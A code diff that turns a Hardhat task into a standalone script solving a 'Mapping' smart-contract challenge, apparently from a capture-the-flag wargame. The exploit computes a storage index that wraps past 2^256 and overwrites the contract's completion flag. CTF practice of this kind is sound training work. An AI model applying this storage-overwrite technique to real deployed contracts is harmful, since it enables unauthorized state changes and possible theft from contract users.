@@ -1,10 +1,10 @@
 import { BigNumber, utils } from "ethers";
-import { task } from "hardhat/config";
+import { ethers } from "hardhat";
 
 const contractAddress = "0x9EDEA871B80E57a6E229109a7eCfA1641Fe15D6c";
 
-task("mapping", "Solves the 'Mapping' challenge", async (_taskArgs, hre) => {
-  const factory = await hre.ethers.getContractFactory("MappingChallenge");
+async function main() {
+  const factory = await ethers.getContractFactory("MappingChallenge");
   const contract = factory.attach(contractAddress);
 
   const MAX_UINT_256 = BigNumber.from("2").pow("256");
@@ -19,4 +19,9 @@ task("mapping", "Solves the 'Mapping' challenge", async (_taskArgs, hre) => {
   const isCompleteSlot = MAX_UINT_256.sub(mapDataSlot);
   const completeTx = await contract.set(isCompleteSlot, "1");
   await completeTx.wait();
+}
+
+main().catch(error => {
+  console.error(error);
+  process.exit(1);
 });
